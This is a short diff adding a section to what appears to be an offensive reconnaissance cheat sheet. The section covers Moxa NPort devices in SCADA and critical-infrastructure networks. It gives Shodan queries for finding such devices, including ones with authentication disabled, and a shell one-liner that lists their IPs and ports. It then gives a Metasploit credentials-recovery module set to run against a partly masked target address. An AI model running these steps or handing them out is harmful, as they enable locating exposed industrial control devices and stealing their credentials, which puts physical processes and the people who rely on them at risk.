@@ -429,3 +429,23 @@ atg_file.close()
 Video PoC:
 
 https://www.youtube.com/watch?v=HkO4cs95erU&t=818s
+
+## Access Moxa Devices:
+
+SCADA system that uses Moxa brand products to establish connectivity and communication with industrial devices that are being monitored and controlled in a critical infrastructure or industrial process.
+
+```console
+"Moxa Nport Device" Status: Authentication enabled port:"4800"
+"Moxa Nport Device" Status: Authentication disabled port:"4800"
+shodan search --separator , --fields ip_str,port,data "Moxa Nport" | awk '{print $1,$2,$3}' FS=":" | tr '\\', ' ' | awk '{print $1,$7,$8}' | column -t | ccze -A
+```
+
+Metasploit:
+
+```console
+use auxiliary/admin/scada/moxa_credentials_recovery
+set FUNCTION CREDS
+set rport 4800
+set rhosts 212.x.x.14
+run
+```
